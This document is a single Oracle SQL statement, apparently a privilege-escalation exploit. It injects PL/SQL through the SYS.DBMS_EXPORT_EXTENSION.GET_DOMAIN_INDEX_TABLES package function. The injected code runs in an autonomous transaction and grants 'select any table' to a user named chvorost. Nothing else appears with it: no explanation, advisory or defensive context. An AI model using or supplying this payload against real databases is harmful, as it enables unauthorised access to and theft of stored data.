select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('INDX', 'SCH','DBMS_OUTPUT.PUT_LINE(:p1); execute immediate ''declare pragma autonomous_transaction; begin execute immediate ''''grant select any table to chvorost'''' ; end;''; END;--','SYS',1,'1',0) from dual
/
